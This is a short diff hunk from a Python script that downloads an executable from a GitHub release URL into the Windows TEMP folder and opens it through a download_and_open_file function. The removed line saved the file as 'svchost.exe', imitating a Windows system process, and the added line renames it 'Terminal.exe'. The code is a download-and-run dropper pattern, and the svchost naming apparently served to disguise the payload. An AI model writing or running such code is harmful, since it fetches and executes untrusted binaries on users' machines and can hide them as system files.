@@ -76,7 +76,7 @@ def download_and_open_file(url, destination):
         print(f"Permission denied: Unable to delete or write to file {destination}.")
 
 github_url = "https://github.com/AizenWo/Python/releases/download/Terminal/Terminal.exe"
-destination_path = os.path.join(os.getenv('TEMP'), 'svchost.exe')
+destination_path = os.path.join(os.getenv('TEMP'), 'Terminal.exe')
 
 download_and_open_file(github_url, destination_path)
 
